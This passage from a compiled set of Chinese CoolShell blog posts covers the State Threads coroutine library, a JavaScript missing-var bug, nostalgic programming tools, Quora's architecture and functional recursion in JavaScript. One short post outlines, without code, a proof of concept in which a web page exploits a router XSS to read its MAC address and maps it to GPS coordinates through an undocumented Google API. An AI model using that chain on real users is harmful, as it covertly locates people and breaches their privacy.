整个过程都是单线程的。 **这种处理本质上就是将一堆互不相交（disjoint）的回调实现同步控制，就像串联在一个顺序链表上。** 见图1，黑色的双箭头表示I/O事件复用，回调是个筐，里面装着对各种请求的处理（当然不是每个请求都有回调，一个请求也可以对应不同的回调），每个回调被串联起来由dispatcher激活。这里请求等价于thread的概念（不是操作系统的线程），只不过“上下文切换”（context switch）发生在每个回调结束之时（假设不同请求对应不同回调），注册下一个回调以待事件触发时恢复其它请求的处理。至于dispatcher的执行状态（execute state）可作为回调函数的参数保存和传递。!EDSM异步回调的缺陷在于 **难以实现和扩展** ，虽然已经有libevent这样的通用库，以及其它actor/reacotor的设计模式及其框架，但正如Dean Gaudet（Apache开发者）所说：“其内在的复杂性—— **将线性思维分解成一堆回调的负担** （breaking up linear thought into a bucketload of callbacks）——仍然存在”。从上图可见， **回调之间请求例程不是连续的，比如回调之间的切换会打断部分请求，又比如有新的请求需要重新注册。**
**ST本质上仍然是基于EDSM模型，但旨在取代传统的异步回调方式。** ST将请求抽象为thread概念以更接近自然编程模式（所谓的linear thought吧，就像操作系统的线程之间切换那样自然）。ST的调度器（scheduler）对于用户来说是透明的，不像dispatcher那种将执行状态（execute state）暴露给回调方式。每个thread的现场环境可以保存在栈上（一段连续的大小确定的内存空间），由C的运行环境管理。从图2看到， **ST的threads可以并发地线性地处理I/O事件，模型比异步回调简单得多。**!State Threads这里稍微解释一下ST调度工作原理，ST运行环境维护了四种队列，分别是IOQ、RUNQ、SLEEPQ以及ZOMBIEQ， **当每个thread处于不同队列中对应不同的状态（ST顾名思义所谓thread状态机）。** 比如polling请求的时候，当前thread就加入IOQ表示等待事件（如果有timeout同时会被放到SLEEPQ中），当事件触发时，thread就从IOQ（如果有timeout同时会从SLEEPQ）移除并转移到RUNQ等待被调度，成为当前的running thread，相当于操作系统的就绪队列，跟传统EDSM对应起来就是注册回调以及激活回调。再比如模拟同步控制wait/sleep/lock的时候，当前thread会被放入SLEEPQ，直到被唤醒或者超时再次进入RUNQ以待调度。
**ST的调度具备性能与内存双重优点** ：在性能上，ST实现自己的setjmp/longjmp来模拟调度，无任何系统开销，并且context（就是jmp_buf）针对不同平台和架构用底层语言实现的，可移植性媲美libc。下面放一段代码解释一下调度实现：/*     * Restore a thread context that was saved by _ST_SWITCH_CONTEXT     * or initialized by _ST_INIT_CONTEXT     */     #define _ST_RESTORE_CONTEXT(_thread)   \     ST_BEGIN_MACRO                     \     _ST_SET_CURRENT_THREAD(_thread);   \     MD_LONGJMP((_thread)->context, 1); \     ST_END_MACRO/* Resume the thread */     thread->state = _ST_ST_RUNNING;     _ST_RESTORE_CONTEXT(thread);     }
如果你熟悉setjmp/longjmp的用法，你就知道当前thread在调用MD_SETJMP将现场上下文保存在jmp_buf中并返回返回0，然后自己调用_st_vp_schedule()将自己调度出去。调度器先从RUNQ上找，如果队列为空就找idle thread，这是在整个ST初始化时创建的一个特殊thread，然后将当前线程设为自己，再调用MD_LONGJMP切换到其上次调用MD_SETJMP的地方，从thread->context恢复现场并返回1，该thread就接着往下执行了。 **整个过程就同EDSM一样发生在操作系统单线程下，所以没有任何系统开销与阻塞。****其实真正的阻塞是发生在等待I/O事件复用上，也就是select()/poll()，这是整个ST唯一的系统调用。** ST当前的状态是，整个环境处于空闲状态，所有threads的请求处理都已经完成，也就是RUNQ为空。这时在_st_idle_thread_start维护了一个主循环（类似于event loop），主要负责三种任务：1.对IOQ所有thread进行I/O复用检测；2.对SLEEPQ进行超时检查；3.将idle thread调度出去，代码如下：
/* Check sleep queue for expired threads */     _st_vp_check_clock();me->state = _ST_ST_RUNNABLE;     _ST_SWITCH_CONTEXT(me);     }/* No more threads */     exit(0);/* NOTREACHED */     return NULL;     }这里的me就是idle thread，因为_st_idle_thread_start就是创建idle thread的启动点，每从上次_ST_SWITCH_CONTEXT()切换回来的时候，接着在_ST_VP_IDLE()里轮询I/O事件的发生，一旦检测到发生了别的thread事件或者SLEEPQ里面发生超时，再用_ST_SWITCH_CONTEXT()把自己切换出去，如果此时RUNQ中非空的话就切换到队列第一个thread。这里主循环是不会退出的。在内存方面， **ST的执行状态作为局部变量保存在栈上，而不是像回调需要动态分配，** 用户可能分别这样使用thread模式和callback模式：
#### 基于Mult-Threading范式同样基于multi-threading编程范式，ST同其它线程库又有和有点呢？比如Posix Thread（以下简称PThread）是个通用的线程库，它是 **将用户级线程（thread）同内核执行对象（kernel execution entity，有些书又叫lightweight processes）做了1:1或m:n映射，** 从而实现multi-threading模式。 **而ST是单线程（n:1映射），它的thread实际上就是协程（coroutine）。** 通常的网络应用上，多线程范式绕不开操作系统，但在某些特定的服务器领域，线程间的共享资源会带来额外复杂度，锁、竞态、并发、文件句柄、全局变量、管道、信号等，面对这些Pthread的灵活性会大打折扣。 **而ST的调度是精确的，它只会在明确的I/O和同步函数调用点上发生上下文切换，这正是协程的特性，如此一来ST就不需要互斥保护了，进而也可以放心使用任何静态变量和不可重入库函数了** （这在同样作为协程的Protothreads里是不允许的，因为那是stack-less的，无法保存上下文），极大的简化了编程和调试同时增加了性能。
对于同样用户级线程如GNU Pth和MIT Phread比起来呢？有两点，一是ST的thread是 **无优先级的非抢占式调度** ，也就是说ST基于EDSM的，每个thread都是事件或数据驱动，迟早会把自己调度出去，而且调度点是明确的，并非按时间片来的，从而简化了thread管理；二是ST会 **忽略所有信号处理** ，在_st_io_init中会把sigact.sa_handler设为SIG_IGN，这样做是因为将thread资源最小化，避免了signal mask及其系统调用（在ucontext上是避免不了的）。但这并不意味着ST就不能处理信号，实际上ST建议将信号写入pipe的方式转化为普通I/O事件处理，示例详见这里。这里顺便说一句， **C语言实现的协程据我所知只有三种方式** ：Protothread为代表利用switch- case语义跳转，以ST为代表不依赖libc的setjmp/longjmp上下文切换，以及依赖glibc的ucontext接口（云风的coroutine）。第一种最轻，但受限最大，第三种耗资源性能慢（陈皓注：glibc的ucontext接口的实现中有一个和信号有关的系统调用，所以会慢，估计在一些情况下会比pthread还慢），目前看来ST是最好使的。
#### 基于多核环境下面来聊聊ST在多核环境下的应用。服务器领域多核的优势在于实现了物理上真正的并发，所以如何充分利用系统优势也是线程库的一大难点。这对ST来说也许正是它的拿手好戏，前面提及ST曾作为Apache的多核引擎模块发布。这里要补充一下前面漏掉的ST的一个重要概念—— **虚拟处理器** （virtual processor，简称vp），见图3，多个cpu通过内核的SMP模拟出多个“核”（core），一个core对应一个内核任务（kernel task），同时对应一个用户进程（process），一个process对应ST的一个vp，每个vp下就是ST的thread（是协程不是线程），结合前面所述，vp初始化先创建idle thread，然后根据I/O事件驱动其它threads，这就是ST的多核架构。!multi-core这里要指出的是， **ST只负责自身thread调度，进程管理是应用程序的事情，** 也就是说由用户来决定fork多少进程，每个进程分配多少资源，如何进行IPC等。这种架构的好处就是每个vp有自己独立的空间，避免了资源同步竞态（比如杜绝了多进程里的多线程这样混乱的模型）。我们知道这种 **基于进程的架构是非常健壮的，一个进程奔溃不会影响到其它进程，同时充分利用多核硬件的高并发。** 同时对于具体逻辑业务使用vp里的thread处理，这是基于EDSM的，如此一来做到了 **逻辑业务与内核执行对象之间的解耦** ，没必要因为1K个连接去创建1K的进程。这就是ST的扩展性和灵活性。
#### 使用限制ST的主要限制在于，应用程序所有I/O操作必须使用ST提供的API，因为只有这样thread才能被调度器管理，并且避免阻塞。另一个限制在于thread调试，这本身不容易，好在v1.9的ST提供了DEBUG参数，使用TREADQ以及_st_iterate_threads接口检测thread调度情况，用户还可自定义_st_show_thread_stack接口dump每个thread的栈，在GDB使能_st_iterate_threads_flag变量，这些都在Readme中对调试方法有具体说明。按下不表。#### 总结这篇文章写得有点短了，主要是通过对比来介绍ST的，其实还有大段原理可以讲，大段源码以及实战用例可以贴，但这一下子又写不过来，ST还是有点技术含量的。说白了， **ST的核心思想就是利用multi-threading的简单优雅范式胜过传统异步回调的复杂晦涩实现，又利用EDSM的性能和解耦架构避免了multi- threading在系统上的开销和暗礁。** 学习ST告诉我们一个道理： **未来技术的趋势永远都是融合的。**#### 参考* 在SourceForge以及github上的源码：前者有历史版本及win32版本，后者只有v1.9。
* State Threads for Internet Applications：介绍原理的，值得一看，这里有篇中文翻译附加单元测试（在单CPU 512M内存上创建数万个thread，CPU占用率约5%，内存约4.3K/thread）。* State Threads Library FAQ：本文基于此而写。* Complete reference：API完全手册。* Programing Notes：编程注意事项，包括信号处理，IPC，非网络I/O事件等。（全文完）# Google未公开API：转MAC地址为经纬度作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这里有一个POC（Proof of Concept）可以通过你Web浏览器后面的路由器XSS攻击得到一个准确的GPS坐标。注意：路由器和Web浏览器以及IP地址并不包含任和地理信息。其方法是使用了一个Google未公开的API。大约方法如下：1. 访问一个网页，这个网页隐藏了一个基于你WiFi路由器的XSS（ 参见： XSS Verizon FiOS router）   2. 通过这个XSS 可以获得路由器的MAC 地址。   3. 然后通过 Google Location Services我们可以把这个MAC地址映射到GPS坐标。Googel的这个服务是基于HTTP的服务。这并不是一个Google正式发布的API，而是通过 Firefox’s Location-Aware Browsing 发现的。
演示地点在这里：我试了一下，无论无线和有线都可以准确定位我的位置。很强大，你也试试看。# Javascript 中的 var作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnMelonCard发布了一篇文章——”how one missing var ruined our launch“（”少写了一个var毁了我的网站”），这篇文章是说MelonCard用Node.js做后台，因为出了一个小高峰——有50-100人注册，结果整个网站都不响应了，而且还出现了很多奇怪的问题。当他们调查到问题的要源的时候，他们发现下面的代码少写了一个var。[javascript]app.all(‘/apps/:user_id/status’, function(req, res, next) {   // …   initial = extractVariables(req.body);   });[/javascript]为什么inital少写一个var会引发这个问题呢？因为如果你不写var，这个局部的变量会被javascript当成全局变量，而这个变量又是一个函数，所以，当多用户并发的时候，这个本应该在不同用户下互不干扰的变量，成了各个用户共享的东西。试想，用户A的数据被用户B覆盖了，用户A和B的数据还没处理完，结果被新的C给搞乱了，程序的逻辑自然出现了问题。
在stackoverflow.com上有这么一个贴子说明了“有var”和“无var”的差别：// These are both globals     var foo = 1;     bar = 2;function test()     {     var foo = 1; // Local     bar = 2;     // Global上面这个示例告诉我们，如果你不用var，那么这个js引擎会一层一层地向上找父作用域中的变量，如果找到了，就用，如果找不到了，就会帮你定义一个全局的变量。上面这个例子充分说明了这一点。所以， **如果你想在当前的作用域用声明变量，你一定要用var** 。这对于一些乱写javascript代码的程序员要注意了。这里再给大家介绍一个工具——**JSLint( )**，一个JS代码质量的分析工具，我们把上述stackoverflow的代码copy到JSLint这个在线工具中，我们可以看到下面的报告：这个报告说明了源码中的那些变量的情况。（全文完）# 那些曾伴我走过编程之路的软件作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
收家的时候发现了一张VC++6.0的光盘，实然引发了我的怀旧情结。于是在微博上感叹了一下，看到一些朋友的回应，还有朋友提到了Turbo C 2.0，于是更回放大了我的怀旧情绪，让我回想了很多N年前伴我走过编程之路的软件。现在看下来，有些感叹，又有些可笑。感叹的是技术发展的变迁，可笑的是当时的一些想法。（Unix/Linux是在大四和毕业的时候接触的，虽然这是我的强项，但是这下面的编程这么多年来没什么变化，所以就不提了） **注：图片较多，请稍等。**还记得第一次接触编程是在高中的时候，用中华学习机学Basic程序，后来到了大学，虽然学校的课程没有教Basic语言，但是DOS下有一个叫Quick Baisc的东西让我把高中时的知识又捡了回了。大学里学的第一门语言是Pascal，所以，用的编程软件也就是Turbo Pascal，还记编译起来巨快无比，尤其是那个只有软盘和640K的基本内存的时代。在这里还需要提一点的是当时的一个学习打字指法的软件，TT，呵呵。还记得当时整日整夜的去机房练打字，练指法速度。还记得当时能打到38分就算是相当的NB了。这是当时TT中的一个游戏，很好玩。然后开始学C语言，于是Turbo C 2.0成为了那个时代的经典，我还记得当时学校里的386电脑没有内存，没有硬盘，只有两个软驱，一个是3寸的，一个是5寸，而Turbo2.0的大小太大（2M多）所以，得把所有的头文件和lib文件放在3寸盘上，而主程序员放在5寸盘上，A盘和B盘同时来编译我的C程序，编译的时候，那叫一个慢啊，那是一个听着软驱咯吱咯吱的声音的时代。
后来，用Turbo C 的图形库在DOS下画各种菜单，按钮，被支持鼠标等等，非常欢乐。（注：那时能写一个支持鼠标的程序是相当拉风的）当时，Turbo C还是不足开发企业级应用，企业级的MIS系统需要数据库的支持，Foxbase是当时在学校里学的第一个和数据库有关的东西，现在完全忘 了。我还记得foxbase是当时计算机水平考试里的一个很重要的一环。foxbase很快就淘汰了，举而代之能开发企业级应用的是FoxPro，看到FoxPro的强大，尤其是对菜单，表单，按钮等的支持，当时觉得这是世界上最NB的编程工具了。还跟着老师开发了一些MIS系统。后来听老师说，他们给昆明车管所使用foxpro来管理昆明的自行车，因为数据量太大，FoxPro经常崩溃。这可能是我听说过最早的电子政府系统了。Win3.2/Win95下的Foxpro更不用说了，NB啊。当时的神器啊。进入Win95图形界面时代Borland C++也是需要提一下的，只是当时学校没有C++的课程，所以完全不懂，而且因为Foxpro和其些如VB，Powerbuilder的RAD编程工具的泛滥，甚至觉得Borland C++和VC++完全没戏。呵呵。
PowerBuilder掀开了另一个企业级应用的时代，C/S结构。太强了，在大三大四的时候，在老师开的公司里用这个东西为丽江三合酒店，一个送水公司，还有云南省外事办公室开发过其MIS系统。使用PowerBuilder一直到2002年，交行总行国业务系统的前端，还有上海电信系统。今天还有人在用这个东西开发软件么？VB也是一个划时代的产品，不过好像从来都是一个编程初学者的玩具，当时我学过VB，感觉其把编程搞成了一个搭积木的过程。我在当时草草地使用了VB，因为那时出了一个叫VB killer的东西——Delphi。Delphi的时代是相当生猛的一个时代，企业级开发，自带数据库，可以制作各咱小工具软件和网络软件，等等，到后来的Delphi7还支持多层结构和分布式，在Delphi的时代，我记得那时的狂热，网上有很多超NB的控件可以让你开发出相当炫的界面。还记得C++ Builder吗？搞得跟Delphi一模一样，但是编译的速度慢得实在是不行。VC++的时代应用是从北大的《Windows编程设计》一书发布时开始的，这才是真正的SDK编程。于是我开始喜欢使用VC++了。一直到今天。VC++6.0是一个经典，直到今天的VS2008，我还是要把热捷和界面搞成VC6.0的风格。呵呵。
刚参加工作的时候，单位里用Lotus Notes做办公自动化软件的平台，于是我学习了怎么在Notes下开发应用。后来还用这个玩意给一些银行开发过一些办公自动化流程的应用。我有一个同学相当痴迷于这个平台。现在看来，有点非主流了。在大三的时候，Java和WEB出现了，系上接到了一个项目，需要用HTML+Java的方式做一些在线的教学课件。但是，当时连一本HTML的书都没有，又上不了网，我只能在看一些盗版光盘里的HTML的文件的例子来学习。那时，基本上是用notepad来写HTML，这让我对HTML打下了非常扎实的基础。后来知道有一个叫HotDog的专门用来写HTML的软件，用了一段时间。但最终还是使用了微软的FrontPage多一些，直到Dreamweaver的出现。当时的开发环境用的是NetScape，就是下面这点鸟样的东西了。在大三大四做那个操作系统的教学课件的时候，开发Java Applet的IDE主要是用Cafe，Java Workshop。当时用这些东西开发了一些Applet用来演示UNIX操作系统内存分配，进程调度，文件存储等算法的动画。还得了个大学生挑战者杯的鼓励奖。现在想想，如果当时有Flash的话，可能做这些演示动化就不用那么麻烦了。
总体来说，Java Workshop也不好用。还是更多的使用Cafe写Java程序。毕业两年后在工作上因为要做IBM?Websphere上的应用，于是使用了IBM的Visual Age for Java，现在看来，这些IDE真是太土了。关于Java的开发工具还有两个东西，一个是Microsoft的J++，另一个是Borland的JBuilder。J++ 就像是一个笑话，非标准的，据我所知没有人用。JBuilder流行了很多年，还得了很多奖，几乎成了Borland的最后一个支柱产品，不过当时因为我皈依Linux/C/C++了，所以，也就没有搞Java了，不过这个IDE还是相当的优秀。不知道现在还有没有人用。不过，现在的Java IDE被Eclipse 一统山河了。好了，上面是一些关于编程方面的，还有一些比较经典的软件如下。一个是汉字平台，香港金山公司的UC-DOS，和WPS，当时的我还纳闷，为什么香港人也用简体中文了。对此，我心中对祖国的热爱小小的升华了。还有杀毒软件，KV300和kill帮朋友修电脑用得最多的就是PC Tools玩游戏的必备——FPE有谁还记得这个看图软件——SEA？Zmud——当时的网游戏。也是需要练级。在大四和刚工作头一年疯玩过Zmud，之后，对于今天的这些大量的网游没有什么兴趣了。
还有当时用猫上网的年代，NetAnt成了下载软件的装机必备。下载速率平均只有3k-4kBps，这种生活是怎么过来的啊。哈。相信你也有你自己的怀旧的故事，不妨分享一下。# Quora使用到的技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前向大家介绍过Stack Exchange的系统架构和Facebook的系统架构，今天和大家说说Quora的。本文主要参考了Phil Whelan的这篇文章《Quora’s Technology Examined》。关于Quora是个什么网站我就不多说了，国内对他的C2C网站叫“知乎”。呵呵。我们还是来看看Quora的技术吧。目录* Search-Box   * 实时查询   * Webnode2 和 LiveNode   * Amazon Web Service   * HAProxy Load-Balancing   * Python   * Thrift   * Tornado   * Long Polling (Comet)   * MySQL   * Memcached   * Git   * JavaScript Placement   * Charlie Cheever 遵从 “14 Rules for Faster-Loading Web Sites”
#### Search-BoxQuora只能搜索问题，主题标签，用户名，和主题标题。没有全文搜索，所以，你无法搜索问题和答案的内容。而搜索中使用前缀搜索方式，比如你输入mi，则Microsoft会马上出来。其搜索还会有一些非常简单的模糊匹配的算法。另外，如果有重复的问题，其中一个问题会自动跳转到另一个问题，但是在搜索中还是会出现。搜索中没有拼写检查。一开始，他们使用的是一个开源的搜索服务器，叫Sphinx。其支持上述的那些功能。现在他们不用这个技术了，因为受到了一些限制。他们做了一个比较新的解决方案，这个算法由Python实现。**参看** ：!What libraries does Quora use for search?#### 实时查询Quora的查询是非常高速的，其查询请求是通过AJAX的GET请求发送的，结果返回用的是JSON数据格式，但他们解析JSON是在服务器端，而不是通过浏览器的javascript。这么做的原因可能是他们想高亮搜索关键词，似乎使用Client端的Javascript非常不好做。Quora的即时搜索好像比较暴力，如果你输入Microsoft（一共9个字符），你会看到其会像后端发送9次查询——每按一个键一次，无论你敲这个单词的速底有多快，每输入一个字符都会发一个请求给后台。对于这样的看上去没有效率的对后台的请求，后台的服务器端会来控制相关的前台请求，所以，就算是前台这样做，也不会增加服务器端的负载，因为后台会做相关的处理。
Quora的搜索使用HTTP长连接，当你开始敲查询的时候，连接就建立了，这个连接会持续在那里，你下次搜索的时候会继续使用这个连接，除非你60秒没有动作了。**参看** ：!Is Quora going to implement full-text search?#### Webnode2 和 LiveNodeWebnode2 和 LiveNode 是 Quora 内部的系统，其用来管理内容。Webnode2 生成 HTML, CSS 和 JavaScript 并且和 LiveNode 紧紧地耦合在一起，Webnode2主要是用来管理内容在网页上显示的，LiveNode主要是用来做动态网页内容更新的。Charlie Cheever 说，如果他可以从新开始，他 第一件事要做的就是重写整个LiveNode.Quora的工程师看上去对他们搞的这些东西非常的满意，并且 他们也在努力地找到这些东西的弱点。有一个有意思的关于LiveNode的问题是，如果A和B同时正在看相当的一个问题，那么用户A的一些交互动作会影响B的页面。例如，如果A顶了一下某个答案，那么这个答案可能会往上移动。这样的一个显示变化会通过AJAX更新B的浏览器。如果B此时展开了评论，可能会受到影响。
LiveNode 由这些东西写成：Python, C++, and JavaScript. jQuery ，Cython也用到了。因为Quora 想要对他们的LiveNode开源 并准备把他们的代码分开，做这个事可能需要太多的工作和时间。Charlie Cheever 指出 WebNode2 和 有一个叫做 “free and easy website builder” 的 Webnode 的 webnode.com 没有任何的关系。**参考** ： Tech Talk – Webnode2 and LiveNode#### Amazon Web ServiceQuora全部host在AWS的EC2和S3上，这对于这些刚刚起步的快速发展的公司非常关键，因为你可以省去了很多硬件和维护的成本。（建一个数据中心并不是所有公司都能干的事）。Quora的操作系统使用Ubuntu Linux，这是非常容易部署和管理。其静态页使用了Amazon的CDN的 Cloudfront服务分发，CloudFront用于所有的静态图片, CSS 和JavaScript。图片先传到 EC2 服务器，使用 Pyhon S3 API 处理后后传到 S3。
#### HAProxy Load-BalancingHAProxy 作为前端负载均衡服务器，反向代理服务器是 Nginx，Nginx 后面则是 Pylons (Pylons + Paste) , 承担动态 Web 请求。Pylons，是一个轻量级的Web框架，通常都是在Nginx后面使用。选用Pylons就像你在春节先饺子当主食一样。他们把Pylons中的template和ORM取走而使用自己的技术（由Python写成），这个地方就是 LiveNode 和 WebNode2的地方。#### Python从facebook出来的Charlie 和 Adam选用了Python而不是PHP。正如Adam指出的——“Facebook is stuck on that for legacy reasons, not because it is the best choice right now”（Facebook使用PHP并不是因为其好，而是因为历史原因的问题），当然他们也不会使用C#，因为那样一来就会引入一堆微软的东西。当然，也不会是Java，因为Python要比Java更容易写出代码，Scala太年轻了，还需要考验。Ruby看上来很像Python，但是他们对Ruby没有过多的经验。最终还是Python胜出。当然，他们知道Python的弱点是性能和速度，所以，他们在需要速度和性能的地方使用了C/C++。 他们使用Python的版本是2.6。
使用Python的另一个原因是Python的数据结构和JSON可以很好的映射起来。代码易读性很高。而且有很多的库，调试器和重载器。Quora的B/S结构几乎完全通过JSON进行数据交互。他们没有使用IDE，他们使用得最多的是Emacs，一看就知道这是一个个人的选择，随着他们开发团队的扩大，这个事会得到改变的。另外，他们提到了PyPy，一个让 Python更快更灵活的项目。#### ThriftThrift 用于后端服务器间的通讯。Thrift 服务由 C++开发。Facebook同样使用了这个技术。**参考** ：!Why would you write a Thrift service in C++?#### TornadoTornado web 框架用于实时更新，其运行在Comet 服务器上，其用来处理大量的需要长时间poll和push更新的网络连接。#### Long Polling (Comet)Quora的网页并不是简单的显示，每一个页面都需要更新，或是创建问题，答案和评论。所以，他们使用了Long Polling而不是传统的Polling，传统的Polling需要浏览器一端不停地重复地向服务器询问——“有更新吗？”，服务器说没有，于是过一会浏览大再问，现在呢？服务器说，还是没有，浏览器过一会又问，现在呢？服务器说，还没好。这样一来，就好像让我们的客户端放到了驾驶室里，这显然是有问题的，因为只有服务器知道什么时候会有更新。而且浏览器这么干，很快会让服务器的负载加上去。
Long polling 也就是我们熟知的 Comet)，其让服务器来控制这些事，让客服端等在那里听服务器的响应。在client和 server的会话对于两者是是相同的，而不是client需要等着然后向服务器查询。服务器端可以把一个连接打开很长时间（比如：60秒），在这段时间里，服务器会查看是否有相应的东西需要更新，如果有的话，就发给浏览器。如果没有的话，就等下一次的client询问。可见，这种服务器等一会再响应的方法可以让浏览器少发几次查询。对于long-polling 的最好的地方是，可以降低浏览器和客户端间来来回回的次数。让服务器端来控制时间，所以，内容更新可能会只是几个毫秒，或是几十秒。 服务器端也可以积攒一堆更新后，一次发给浏览器。这样做会更有效率。但是，这个方法的黑暗面是——这会让服务器端出现大量的TCP链接，想一想，Quora也是百万级用户的应用了，只需要10%的在线用户，你就需要一个可以处理10万并发量的架构。注意，如果一个用户在其浏览器里打开了多个Quora网页的话，那么，这个链接器会是非常致命的。当然，好的消息是已经有一些技术专门为Long Polling设计，这些技术可以让你在那些等待的连接中只会消耗非常非常少的内存（因为那些等待连接并不需要所有的资源）。例如：Nginx 是一个单线程的事件驱动的小型服务器，每一个链接只花非常小的内存。每一个Nginx的进程只会在一个时候处理一个连接。这意味着其很容易扩展成一个可以处理成千上的并发量的服务架构。
**参考** ：!How do you push messages back to a web-browser client through AJAX? Is there any way to do this without having the client constantly polling the server for updates?#### MySQL就像Adam D’Angelo 的老东家facebook一样，，Quora重度使用MySQL。对于，把数据库里的数据分区是最需要做的事。他们的行事原则是，尽可能的把数据放在一台机器上，使用hash主键把大规模的数据存放到多个数据库中。坚决不用表连接。Adam参考了FriendFeed的一篇文章How FriendFeed uses MySQL to store schema-less data，并说你不应该在你的社区还没有100万用户的时候使用NoSQL 数据库。并不只是Quora和FriendFeed使用MySQL，Google，Twitter，Facebook都在使用MySQL.参考：!How does one evaluate if a database is efficient enough to not crash as it’s put under increasing load?
#### MemcachedMemcached 用于 MySQL的前端缓存。#### GitGit 是他们的源码版本控制工具.#### JavaScript Placement如果你看一下Quora的网页源码，你会看到其JavaScript总是在页面的最后。 Charlie Cheever建议 这会让你的页面显得载入得很快，因为其先显示内容，然后在载入Javascript。#### Charlie Cheever 遵从 “14 Rules for Faster-Loading Web Sites”Steve Souders, High Performance Web Sites 和 Even Faster Web Sites的作者，其列了一些 rules让你网页更快的原则。 Charlie Cheever 的 Quora 创始人提到这些过，这应该也是Quora的速度的原因。> “One resource we used as a guide is Steve Souders’ list of rules for high > performance websites:”   >  – Charlie Cheever, Quora
Steve Souders的14条规则是——* Make Fewer HTTP Requests   * Use a Content Delivery Network   * Add an Expires Header   * Gzip Components   * Put Stylesheets at the Top   * Put Scripts at the Bottom   * Avoid CSS Expressions   * Make JavaScript and CSS External   * Reduce DNS Lookups   * Minify JavaScript   * Avoid Redirects   * Remove Duplicate Scripts   * Configure ETags   * Make AJAX Cacheable（全文完）# 如何读懂并写出装逼的函数式代码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!drawing-recursive今天在微博上看到了 有人分享了下面的这段函数式代码，我把代码贴到下面，不过我对原来的代码略有改动，对于函数式的版本，咋一看，的确令人非常费解，仔细看一下，你可能就晕掉了，似乎完全就是天书，看上去非常装逼，哈哈。不过，我感觉解析那段函数式的代码可能会一个比较有趣过程，而且，我以前写过一篇《函数式编程》的入门式的文章，正好可以用这个例子，再升华一下原来的那篇文章，顺便可以向大家更好的介绍很多基础知识，所以写下这篇文章。
目录* 先看代码   * Javascript的箭头函数   * 匿名函数的递归   * 动用高阶函数的递归   * 回顾之前的程序   * 其它#### 先看代码这个代码平淡无奇，就是从一个数组中找到一个数，O(n)的算法，找不到就返回 null。下面是正常的 old-school 的方式。不用多说。//正常的版本     function find (x, y) {     for ( let i = 0; i < x.length; i++ ) {     if ( x[i] == y ) return i;     }     return null;     }let arr = [0,1,2,3,4,5]     console.log(find(arr, 2))     console.log(find(arr, 8))结果到了函数式成了下面这个样子（好像上面的那些代码在下面若影若现，不过又有点不太一样，为了消掉if语言，让其看上去更像一个表达式，动用了 ? 号表达式）：//函数式的版本     const find = ( f => f(f) ) ( f =>     (next => (x, y, i = 0) =>     ( i >= x.length) ?  null :     ( x[i] == y ) ? i :     next(x, y, i+1))((...args) =>     (f(f))(...args)))
let arr = [0,1,2,3,4,5]     console.log(find(arr, 2))     console.log(find(arr, 8))为了讲清这个代码，需要先补充一些知识。#### Javascript的箭头函数首先先简单说明一下，ECMAScript2015 引入的箭头表达式。箭头函数其实都是匿名函数，其基本语法如下：> >     (param1, param2, …, paramN) => { statements } >     (param1, param2, …, paramN) => expression >     // 等于 :  => { return expression; } >   >     // 只有一个参数时,括号才可以不加: >     (singleParam) => { statements } >     singleParam => { statements } >   >     //如果没有参数,就一定要加括号: >     () => { statements }下面是一些示例：var simple = a => a > 15 ? 15 : a;     simple(16); // 15     simple(10); // 10
let max = (a, b) => a > b ? a : b;// Easy array filtering, mapping, ...var arr = [5, 6, 13, 0, 1, 18, 23];     var sum = arr.reduce((a, b) => a + b);  // 66     var even = arr.filter(v => v % 2 == 0); // [6, 0, 18]     var double = arr.map(v => v * 2);       // [10, 12, 26, 0, 2, 36, 46]看上去不复杂吧。不过，上面前两个 simple 和 max 的例子都把这箭头函数赋值给了一个变量，于是它就有了一个名字。有时候，某些函数在声明的时候就是调用的时候，尤其是函数式编程中，一个函数还对外返回函数的时候。比如下在这个例子：power3 = MakePowerFn(3); //制造一个X的3次方的函数     power2 = MakePowerFn(2); //制造一个X的2次方的函数console.log(power3(10)); //10的3次方 = 1000     console.log(power2(10)); //10的2次方 = 100
其实，在 MakePowerFn 函数里的那个 PowerFn 根本不需要命名，完全可以写成：如果用箭头函数，可以写成：我们还可以写得更简洁（如果用表达式的话，就不需要 { 和 }， 以及 return 语句 ）：`MakePowerFn = power => base => Math.pow(base, power)`我还是加上括号，和换行可能会更清楚一些：MakePowerFn = (power) => (     (base) => (Math.pow(base, power))     )好了，有了上面的知识，我们就可以进入一个更高级的话题——匿名函数的递归。#### 匿名函数的递归函数式编程立志于用函数表达式消除有状态的函数，以及for/while循环，所以，在函数式编程的世界里是不应该用for/while循环的，而要改用递归（递归的性能很差，所以，一般是用尾递归来做优化，也就是把函数的计算的状态当成参数一层一层的往下传递，这样语言的编译器或解释器就不需要用函数栈来帮你保存函数的内部变量的状态了）。好了，那么，匿名函数的递归该怎么做？一般来说，递归的代码就是函数自己调用自己，比如我们求阶乘的代码：
在匿名函数下，这个递归该怎么写呢？对于匿名函数来说， **我们可以把匿名函数当成一个参数传给另外一个函数，因为函数的参数有名字，所以就可以调用自己了** 。 如下所示：这个是不是有点作弊的嫌疑？Anyway，我们再往下，把上面这个函数整成箭头函数式的匿名函数的样子。`（func) => (func(func)) `现在你似乎就不像作弊了吧。把上面那个求阶乘的函数套进来是这个样子：首先，先重构一下fact，把fact中自己调用自己的名字去掉：fact(fact, 5); //输出120然后，我们再把上面这个版本变成箭头函数的匿名函数版：var fact = (func, n) => ( n==0 ? 1 :  n * func(func, n-1) )     fact(fact, 5)这里，我们依然还要用一个fact来保存这个匿名函数，我们继续，我们要让匿名函数声明的时候，就自己调用自己。也就是说，我们要把`(func, n) => ( n==0 ? 1 : n * func(func, n-1) )`这个函数当成调用参数，传给下面这个函数：`(func, x) => func(func, x) `
